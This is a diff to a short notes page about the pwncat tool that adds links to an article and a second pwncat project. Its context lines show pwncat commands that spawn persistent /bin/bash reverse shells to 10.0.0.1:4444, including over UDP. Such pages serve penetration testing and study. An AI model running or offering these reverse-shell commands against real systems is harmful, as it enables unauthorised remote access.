@@ -1,5 +1,7 @@
 # pwncat
 
+{% embed url="https://hakin9.org/pwncat-netcat-on-steroids-with-firewall-ids-ips-evasion-bind-and-reverse-shell-self-injecting-shell-and-port-forwarding-magic-and-its-fully-scriptable-with-python-pse/" %}
+
 {% embed url="https://github.com/cytopia/pwncat" %}
 
 ```
@@ -92,3 +94,7 @@ pwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444
 Unbreakable UDP reverse shell
 pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 ```
+
+## <mark style="color:red;">Also Pwncat :)</mark>
+
+{% embed url="https://github.com/calebstewart/pwncat" %}
